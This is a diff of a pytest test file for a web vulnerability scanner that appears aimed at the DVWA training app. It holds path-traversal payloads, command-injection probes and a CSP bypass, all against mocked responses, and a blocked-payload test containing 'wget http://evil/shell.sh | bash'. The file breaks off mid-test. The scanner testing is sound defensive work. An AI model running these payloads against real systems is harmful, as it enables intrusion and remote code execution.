@@ -9,8 +9,11 @@ from backend.helper.agent.sub_agent.payload import PayloadAgent
 from backend.helper.agent.sub_agent.probe import TargetProbeAgent
 from backend.helper.agent.sub_agent.scanner import ScanScope, WebScannerAgent
 from backend.helper.auth import auth_summary
+from backend.helper.evidence.finding import FindingFactory, IdFactory
+from backend.helper.evidence.matchers import response_evidence, safe_active_payload
 from backend.helper.settings import RuntimeSettings
 from backend.helper.utils import normalize_url
+from backend.helper.vuln_rules import RuleRegistry
 
 
 def settings(**overrides) -> RuntimeSettings:
@@ -27,6 +30,13 @@ def settings(**overrides) -> RuntimeSettings:
         "active_scan": False,
         "active_request_timeout": 1,
         "max_active_inputs": 5,
+        "command_injection_probes": True,
+        "fetch_same_origin_scripts": True,
+        "max_script_bytes": 200000,
+        "ssrf_callback_url": None,
+        "stored_xss_probes": False,
+        "file_upload_probes": False,
+        "open_redirect_probes": True,
         "focus_target_path": True,
         "llm_analysis": True,
         "llm_on_local_targets": True,
@@ -34,6 +44,7 @@ def settings(**overrides) -> RuntimeSettings:
         "llm_payload_max_per_param": 5,
         "llm_payload_report_only": True,
         "report_confirmed_only": True,
+        "report_verifiable_candidates": True,
         "allowed_hosts": [],
         "exclude_paths": [],
         "auth_headers": {},
@@ -58,6 +69,39 @@ def test_runtime_settings_allow_local_llm_by_default() -> None:
     runtime = RuntimeSettings(None, None, "deepseekV4-flash", None)
 
     assert runtime.llm_on_local_targets is True
+    assert runtime.command_injection_probes is True
+
+
+def test_rule_registry_order_and_finding_factory_metadata() -> None:
+    registry = RuleRegistry.default_rules()
+    passive_names = [rule.__class__.__name__ for rule in registry.passive_rules]
+    input_names = [rule.__class__.__name__ for rule in registry.input_rules]
+    factory = FindingFactory(IdFactory())
+    evidence = response_evidence({"url": "http://example.com", "status_code": 200, "body_length": 12}, matched="demo")
+
+    finding = factory.create(
+        factory.new_id("T"),
+        "测试发现",
+        "Low",
+        "High",
+        "information_disclosure",
+        "http://example.com",
+        "demo",
+        [],
+        "确认漏洞",
+        request_response=evidence,
+        details={"rule_id": "unit_rule", "evidence_type": "unit"},
+    )
+
+    assert passive_names[:2] == ["SecurityHeadersRule", "HeaderDisclosureRule"]
+    assert input_names[:3] == ["DomXssRule", "OpenRedirectRule", "SsrfCandidateRule"]
+    assert finding["id"] == "NOVA-T-001"
+    assert finding["category_label"] == "信息泄露"
+    assert finding["request_response"]["matched"] == "demo"
+    assert finding["details"]["evidence_type"] == "unit"
+    assert finding["executed_payloads"] == []
+    assert finding["poc"]["type"] == "evidence_only"
+    assert finding["llm_payload_advice"] == []
 
 
 def test_probe_detects_basic_auth_and_redacts_headers(monkeypatch) -> None:
@@ -103,7 +147,7 @@ def test_scanner_fetch_extracts_get_form_inputs_and_auth(monkeypatch) -> None:
     <html><head><title>Mock</title></head>
     <body>
       <a href="/next?item=1">Next</a>
-      <form method="get" action="/vulnerabilities/sqli/">
+      <form method="get" action="">
         <input name="id" type="text">
         <input name="Submit" type="submit">
       </form>
@@ -157,6 +201,113 @@ def test_scanner_fetch_extracts_get_form_inputs_and_auth(monkeypatch) -> None:
     assert points["Submit"]["active_testable"] is False
     assert seen_headers["Cookie"] == "sid=secret"
     assert result["auth"]["redacted_headers"]["Cookie"] != "sid=secret"
+
+
+def test_scanner_collects_inline_same_origin_scripts_and_form_metadata(monkeypatch) -> None:
+    html = """
+    <html><head><title>Scripts</title>
+      <script>const token='NOVA_TOKEN'; document.write(location.hash)</script>
+      <script src="/static/app.js"></script>
+    </head><body>
+      <form method="post" action="/comment">
+        <textarea name="comment"></textarea>
+      </form>
+      <form method="post" action="/upload" enctype="multipart/form-data">
+        <input name="avatar" type="file">
+      </form>
+    </body></html>
+    """
+    script = "eval(location.hash); //# sourceMappingURL=app.js.map"
+
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+        def get_all(self, name, _default=None):
+            return []
+
+        def items(self):
+            return super().items()
+
+    class Response:
+        status = 200
+        headers = Headers({"Content-Type": "text/html"})
+
+        def __init__(self, url: str) -> None:
+            self.url = url
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            if self.url.endswith("/static/app.js"):
+                return script.encode("utf-8")
+            return html.encode("utf-8")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", lambda request, **_kwargs: Response(request.full_url))
+
+    result = WebScannerAgent(settings(max_links=5)).scan("http://example.com/page")
+    page = result["pages"][0]
+
+    assert len(page["scripts"]) == 2
+    assert any(item.get("inline") and "document.write" in item.get("content_sample", "") for item in page["scripts"])
+    assert any(not item.get("inline") and "sourceMappingURL" in item.get("content_sample", "") for item in page["scripts"])
+    assert page["forms"][0]["candidate_purpose"] == "stored_xss_candidate"
+    assert page["forms"][1]["candidate_purpose"] == "file_upload"
+    assert page["forms"][1]["file_inputs"][0]["name"] == "avatar"
+
+
+def test_scanner_extracts_query_params_from_links(monkeypatch) -> None:
+    html = """
+    <html><head><title>Redirect</title></head><body>
+      <a href="/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1">Quote 1</a>
+      <a href="/DVWA/vulnerabilities/fi/?page=include.php">File Inclusion</a>
+      <a href="https://example.invalid/redirect?next=/home">External</a>
+    </body></html>
+    """
+
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+        def get_all(self, name, _default=None):
+            return []
+
+    class Response:
+        status = 200
+        headers = Headers({"Content-Type": "text/html"})
+
+        def __init__(self, url: str) -> None:
+            self.url = url
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return html.encode("utf-8")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.scanner.urlopen", lambda request, **_kwargs: Response(request.full_url))
+
+    result = WebScannerAgent(settings(max_pages=1)).scan("http://127.0.0.1/DVWA/vulnerabilities/open_redirect/")
+    points = result["pages"][0]["input_points"]
+    redirect_point = next(item for item in points if item["name"] == "redirect")
+    fi_point = next(item for item in points if item["name"] == "page")
+    external_point = next(item for item in points if item["name"] == "next")
+
+    assert redirect_point["source"] == "link"
+    assert redirect_point["active_testable"] is True
+    assert "source/low.php" in redirect_point["url"]
+    assert fi_point["source"] == "link"
+    assert fi_point["active_testable"] is False
+    assert fi_point["active_scope_reason"] == "outside_target_path"
+    assert external_point["source"] == "link"
+    assert external_point["active_testable"] is False
 
 
 def test_scanner_focuses_active_inputs_on_target_path(monkeypatch) -> None:
@@ -213,6 +364,9 @@ def test_scanner_focuses_active_inputs_on_target_path(monkeypatch) -> None:
     assert points["default"]["active_testable"] is True
     assert points["username"]["active_testable"] is False
     assert points["username"]["active_scope_reason"] == "outside_target_path"
+    brute_page = next(page for page in result["pages"] if page["final_url"].endswith("/brute/"))
+    assert brute_page["forms"][0]["active_testable"] is False
+    assert brute_page["forms"][0]["active_scope_reason"] == "outside_target_path"
 
 
 def test_scanner_dedupes_reflected_query_links_to_avoid_crawl_loop(monkeypatch) -> None:
@@ -535,8 +689,8 @@ def test_auditor_detects_boolean_sqli(monkeypatch) -> None:
 
     audit = AuditorAgent(settings(active_scan=True)).audit(webscan)
 
-    assert any(item["title"] == "疑似布尔型 SQL 注入" for item in audit["findings"])
-    assert audit["summary"]["suspected"] == 1
+    assert any(item["title"] == "确认存在布尔型 SQL 盲注" for item in audit["findings"])
+    assert audit["summary"]["confirmed"] == 1
 
 
 def test_auditor_short_circuits_active_probe_when_baseline_times_out(monkeypatch) -> None:
@@ -675,6 +829,727 @@ def test_auditor_classifies_dvwa_dom_xss_without_sql_probe(monkeypatch) -> None:
     assert audit["summary"]["confirmed"] == 1
 
 
+def test_auditor_confirms_lfi_from_read_only_file_signature(monkeypatch) -> None:
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+    class Response:
+        def __init__(self, url: str, body: str) -> None:
+            self.url = url
+            self.status = 200
+            self.headers = Headers({"Content-Type": "text/html"})
+            self.body = body
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return self.body.encode("utf-8")
+
+    def fake_urlopen(request, **_kwargs):
+        url = request.full_url
+        value = parse_qs(urlparse(url).query).get("page", [""])[0]
+        if "etc/passwd" in value:
+            return Response(url, "root:x:0:0:root:/root:/bin/bash")
+        return Response(url, "normal include page")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "input_points": [
+                    {
+                        "name": "page",
+                        "method": "GET",
+                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+                        "active_testable": True,
+                    }
+                ]
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")
+
+    assert finding["title"] == "确认存在本地文件包含/目录穿越"
+    assert finding["category"] == "lfi"
+    assert finding["details"]["evidence_type"] == "file_read_signature"
+    assert any("etc/passwd" in payload for payload in finding["payloads"])
+
+
+def test_auditor_confirms_lfi_with_deep_windows_winini_payload(monkeypatch) -> None:
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+    class Response:
+        def __init__(self, url: str, body: str) -> None:
+            self.url = url
+            self.status = 200
+            self.headers = Headers({"Content-Type": "text/html"})
+            self.body = body
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return self.body.encode("utf-8")
+
+    def fake_urlopen(request, **_kwargs):
+        url = request.full_url
+        value = parse_qs(urlparse(url).query).get("page", [""])[0]
+        if value == "../../../../../../../../windows/win.ini":
+            return Response(url, "[fonts]\r\n[extensions]\r\n")
+        return Response(url, "normal include page")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "input_points": [
+                    {
+                        "name": "page",
+                        "method": "GET",
+                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+                        "active_testable": True,
+                    }
+                ]
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")
+
+    assert finding["category"] == "lfi"
+    assert finding["details"]["evidence_type"] == "file_read_signature"
+    assert "../../../../../../../../windows/win.ini" in finding["payloads"]
+
+
+def test_auditor_does_not_report_outside_target_forms_when_scanning_fi(monkeypatch) -> None:
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+    class Response:
+        def __init__(self, url: str, body: str) -> None:
+            self.url = url
+            self.status = 200
+            self.headers = Headers({"Content-Type": "text/html"})
+            self.body = body
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return self.body.encode("utf-8")
+
+    def fake_urlopen(request, **_kwargs):
+        url = request.full_url
+        value = parse_qs(urlparse(url).query).get("page", [""])[0]
+        if "etc/passwd" in value:
+            return Response(url, "root:x:0:0:root:/root:/bin/bash")
+        return Response(url, "normal include page")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    csrf_form = {
+        "method": "GET",
+        "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+        "active_testable": False,
+        "active_scope_reason": "outside_target_path",
+        "inputs": [
+            {"name": "password_new", "type": "password", "value": ""},
+            {"name": "password_conf", "type": "password", "value": ""},
+            {"name": "Change", "type": "submit", "value": "Change"},
+        ],
+    }
+    upload_form = {
+        "method": "POST",
+        "action": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
+        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
+        "active_testable": False,
+        "active_scope_reason": "outside_target_path",
+        "enctype": "multipart/form-data",
+        "inputs": [{"name": "uploaded", "type": "file", "value": ""}],
+        "candidate_purpose": "file_upload",
+        "file_inputs": [{"name": "uploaded", "type": "file", "value": ""}],
+    }
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [csrf_form, upload_form],
+        "pages": [
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+                "forms": [],
+                "input_points": [
+                    {
+                        "name": "page",
+                        "method": "GET",
+                        "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+                        "active_testable": True,
+                    }
+                ],
+            },
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+                "forms": [csrf_form],
+                "input_points": [],
+            },
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/upload/",
+                "forms": [upload_form],
+                "input_points": [],
+            },
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    categories = {item["category"] for item in audit["findings"]}
+
+    assert "lfi" in categories
+    assert "csrf" not in categories
+    assert "file_upload" not in categories
+
+
+def test_auditor_confirms_command_injection_with_echo_marker(monkeypatch) -> None:
+    class Headers(dict):
+        def get_content_charset(self):
+            return "utf-8"
+
+    class Response:
+        def __init__(self, url: str, body: str) -> None:
+            self.url = url
+            self.status = 200
+            self.headers = Headers({"Content-Type": "text/html"})
+            self.body = body
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return self.body.encode("utf-8")
+
+    def fake_urlopen(request, **_kwargs):
+        url = request.full_url
+        value = parse_qs(urlparse(url).query).get("ip", [""])[0]
+        if "echo NOVA_CMD" in value:
+            return Response(url, "ping output NOVA_CMD")
+        return Response(url, "ping output")
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "input_points": [
+                    {
+                        "name": "ip",
+                        "method": "GET",
+                        "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
+                        "active_testable": True,
+                    }
+                ]
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")
+
+    assert finding["title"] == "确认存在命令注入"
+    assert finding["category"] == "command_injection"
+    assert finding["details"]["evidence_type"] == "command_echo_marker"
+    assert "NOVA_CMD" in finding["request_response"]["matched"]
+
+
+def test_auditor_detects_passive_error_disclosure() -> None:
+    webscan = {
+        "target": "http://example.com/debug",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://example.com/debug",
+                "html_sample": "Traceback (most recent call last): File /var/www/app.py line 1",
+                "input_points": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["status"] == "确认漏洞")
+
+    assert finding["category"] == "information_disclosure"
+    assert finding["details"]["evidence_type"] == "body_pattern"
+    assert finding["details"]["leak_type"] in {"stack_trace", "unix_path"}
+
+
+def test_active_payload_safety_filter_blocks_dangerous_probe() -> None:
+    allowed, reason = safe_active_payload("127.0.0.1; echo NOVA_CMD")
+    blocked, block_reason = safe_active_payload("127.0.0.1; wget http://evil/shell.sh | bash")
+
+    assert allowed is True
+    assert reason == "通过主动探测安全过滤"
+    assert blocked is False
+    assert "外连" in block_reason
+
+
+def test_auditor_detects_csp_javascript_session_and_crypto_signals() -> None:
+    jwt_alg_none = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0."
+    webscan = {
+        "target": "http://example.com/app",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src * 'unsafe-inline'; script-src 'unsafe-eval'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [{"name": "SESSIONID", "value": "12345678", "secure": False, "httponly": False, "samesite": ""}, {"name": "jwt", "value": jwt_alg_none, "secure": True, "httponly": True, "samesite": "Lax"}],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://example.com/app",
+                "html_sample": "token=0123456789abcdef0123456789abcdef",
+                "scripts": [
+                    {
+                        "url": "http://example.com/app.js",
+                        "content_sample": "const api_key='NOVA_SECRET_TOKEN'; document.body.innerHTML=location.hash; //# sourceMappingURL=app.js.map",
+                        "hash": "demo",
+                    }
+                ],
+                "input_points": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
+    categories = {item["category"] for item in audit["findings"]}
+
+    assert {"csp_weakness", "javascript_exposure", "weak_session", "crypto_weakness"} <= categories
+    assert any(item["status"] == "确认漏洞" and item["category"] == "csp_weakness" for item in audit["findings"])
+    assert any(item["status"] == "确认漏洞" and item["category"] == "javascript_exposure" for item in audit["findings"])
+    assert any(item["details"].get("signal") == "numeric_session_id" for item in audit["findings"])
+    assert any(item["details"].get("weakness") == "jwt_alg_none" for item in audit["findings"])
+
+
+def test_auditor_confirms_dvwa_javascript_client_side_token_bypass(monkeypatch) -> None:
+    calls: list[dict[str, str]] = []
+
+    def fake_post_form(self, url: str, fields: dict[str, str]):
+        calls.append(dict(fields))
+        body = "<p style='color:red'>Well done!</p>" if fields.get("token") == "XXsseccusXX" else "<p>Invalid token.</p>"
+        return {
+            "url": url,
+            "status_code": 200,
+            "headers": {},
+            "body": body,
+            "body_length": len(body),
+        }
+
+    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fake_post_form)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
+                "title": "Vulnerability: JavaScript Attacks :: DVWA",
+                "forms": [
+                    {
+                        "method": "POST",
+                        "action": "http://127.0.0.1/DVWA/vulnerabilities/javascript/",
+                        "inputs": [
+                            {"name": "token", "type": "hidden", "value": ""},
+                            {"name": "phrase", "type": "text", "value": "ChangeMe"},
+                            {"name": "send", "type": "submit", "value": "Submit"},
+                        ],
+                    }
+                ],
+                "input_points": [],
+                "scripts": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "javascript_exposure")
+
+    assert finding["status"] == "确认漏洞"
+    assert finding["title"] == "确认存在 JavaScript 客户端校验绕过"
+    assert finding["details"]["evidence_type"] == "client_side_token_bypass"
+    assert finding["request_response"]["successful_level_guess"] == "medium"
+    assert len(calls) == 2
+    assert calls[-1]["phrase"] == "success"
+
+
+def test_auditor_confirms_dvwa_csp_external_script_bypass(monkeypatch) -> None:
+    calls: list[dict[str, str]] = []
+
+    def fake_post_form(self, url: str, fields: dict[str, str]):
+        calls.append(dict(fields))
+        include = fields.get("include", "")
+        body = f"<html><script src='{include}'></script></html>"
+        return {
+            "url": url,
+            "status_code": 200,
+            "headers": {"Content-Security-Policy": "script-src 'self' https://digi.ninja ;"},
+            "body": body,
+            "body_length": len(body),
+        }
+
+    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fake_post_form)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "script-src 'self' https://digi.ninja ;",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
+                "title": "Vulnerability: Content Security Policy (CSP) Bypass :: DVWA",
+                "forms": [
+                    {
+                        "method": "POST",
+                        "action": "http://127.0.0.1/DVWA/vulnerabilities/csp/",
+                        "active_testable": True,
+                        "inputs": [
+                            {"name": "include", "type": "text", "value": ""},
+                            {"name": "", "type": "submit", "value": "Include"},
+                        ],
+                    }
+                ],
+                "input_points": [],
+                "scripts": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "csp_weakness" and item["status"] == "确认漏洞")
+
+    assert finding["title"] == "确认存在 CSP 白名单脚本加载绕过"
+    assert finding["details"]["rule_id"] == "dvwa_csp_bypass"
+    assert finding["details"]["evidence_type"] == "external_script_whitelist_bypass"
+    assert "https://digi.ninja/dvwa/alert.js" in finding["payloads"]
+    assert calls[0]["include"] == "https://digi.ninja/dvwa/alert.js"
+
+
+def test_auditor_confirms_dvwa_weak_session_id_generation(monkeypatch) -> None:
+    calls: list[str] = []
+
+    class Headers(dict):
+        def __init__(self, cookie_value: str) -> None:
+            super().__init__({"Content-Type": "text/html"})
+            self.cookie_value = cookie_value
+
+        def get_content_charset(self):
+            return "utf-8"
+
+        def get_all(self, name, _default=None):
+            if name.lower() == "set-cookie":
+                return [f"dvwaSession={self.cookie_value}; path=/DVWA/vulnerabilities/weak_id/"]
+            return []
+
+    class Response:
+        status = 200
+
+        def __init__(self, url: str, cookie_value: str) -> None:
+            self.url = url
+            self.headers = Headers(cookie_value)
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return b"<html>Weak Session IDs</html>"
+
+    def fake_urlopen(request, **_kwargs):
+        calls.append(request.full_url)
+        return Response(request.full_url, str(len(calls)))
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                "forms": [
+                    {
+                        "method": "GET",
+                        "action": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                        "active_testable": True,
+                        "inputs": [{"name": "Generate", "type": "submit", "value": "Generate"}],
+                    }
+                ],
+                "input_points": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "weak_session")
+
+    assert finding["status"] == "确认漏洞"
+    assert finding["title"] == "确认存在弱会话 ID 生成风险"
+    assert finding["details"]["evidence_type"] == "weak_session_sequence"
+    assert finding["details"]["signal"] == "sequential_numeric_cookie"
+    assert finding["request_response"]["observed_values"] == ["1", "2", "3"]
+    assert all("Generate=Generate" in url for url in calls)
+
+
+def test_auditor_confirms_dvwa_weak_session_id_generation_post_form(monkeypatch) -> None:
+    calls: list[tuple[str, str, bytes | None]] = []
+
+    class Headers(dict):
+        def __init__(self, cookie_value: str) -> None:
+            super().__init__({"Content-Type": "text/html"})
+            self.cookie_value = cookie_value
+
+        def get_content_charset(self):
+            return "utf-8"
+
+        def get_all(self, name, _default=None):
+            if name.lower() == "set-cookie":
+                return [f"dvwaSession={self.cookie_value}; path=/DVWA/vulnerabilities/weak_id/"]
+            return []
+
+    class Response:
+        status = 200
+
+        def __init__(self, url: str, cookie_value: str) -> None:
+            self.url = url
+            self.headers = Headers(cookie_value)
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb):
+            return False
+
+        def read(self, *_):
+            return b"<html>Weak Session IDs</html>"
+
+    def fake_urlopen(request, **_kwargs):
+        calls.append((request.full_url, request.get_method(), request.data))
+        return Response(request.full_url, str(len(calls)))
+
+    monkeypatch.setattr("backend.helper.agent.sub_agent.auditor.urlopen", fake_urlopen)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                "forms": [
+                    {
+                        "method": "POST",
+                        "action": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                        "page_url": "http://127.0.0.1/DVWA/vulnerabilities/weak_id/",
+                        "active_testable": True,
+                        "inputs": [{"name": "", "type": "submit", "value": "Generate"}],
+                    }
+                ],
+                "input_points": [],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "weak_session")
+
+    assert finding["status"] == "确认漏洞"
+    assert finding["details"]["evidence_type"] == "weak_session_sequence"
+    assert finding["request_response"]["method"] == "POST"
+    assert finding["request_response"]["observed_values"] == ["1", "2", "3"]
+    assert finding["payloads"] == ["POST http://127.0.0.1/DVWA/vulnerabilities/weak_id/ (Generate)"]
+    assert all(method == "POST" for _url, method, _data in calls)
+    assert all(url == "http://127.0.0.1/DVWA/vulnerabilities/weak_id/" for url, _method, _data in calls)
+
+
+def test_auditor_confirms_open_redirect_with_external_location(monkeypatch) -> None:
+    def fake_no_redirect(self, url: str):
+        return {
+            "url": url,
+            "status_code": 302,
+            "headers": {"Location": "https://nova.invalid/redirect-check"},
+            "body": "",
+            "body_length": 0,
+        }
+
+    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.get_no_redirect", fake_no_redirect)
+    webscan = {
+        "target": "http://example.com/redirect?next=/home",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [],
+        "pages": [
+            {
+                "final_url": "http://example.com/redirect?next=/home",
+                "input_points": [{"name": "next", "method": "GET", "url": "http://example.com/redirect?next=/home", "active_testable": True}],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "open_redirect")
+
+    assert finding["status"] == "确认漏洞"
+    assert finding["details"]["evidence_type"] == "external_redirect"
+    assert "nova.invalid" in finding["request_response"]["matched"]
+
+
+def test_auditor_marks_ssrf_stored_xss_and_upload_as_candidates(monkeypatch) -> None:
+    def fail_post(*_args, **_kwargs):
+        raise AssertionError("default candidate rules must not submit forms")
+
+    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_form", fail_post)
+    monkeypatch.setattr("backend.helper.evidence.http.HttpClient.post_multipart_text_file", fail_post)
+    webscan = {
+        "target": "http://example.com/post",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [
+            {
+                "method": "POST",
+                "action": "http://example.com/comment",
+                "enctype": "application/x-www-form-urlencoded",
+                "inputs": [{"name": "comment", "type": "text", "value": ""}, {"name": "submit", "type": "submit", "value": "save"}],
+                "candidate_purpose": "stored_xss_candidate",
+                "file_inputs": [],
+            },
+            {
+                "method": "POST",
+                "action": "http://example.com/upload",
+                "enctype": "multipart/form-data",
+                "inputs": [{"name": "avatar", "type": "file", "value": ""}],
+                "candidate_purpose": "file_upload",
+                "file_inputs": [{"name": "avatar", "type": "file", "value": ""}],
+            },
+        ],
+        "pages": [
+            {
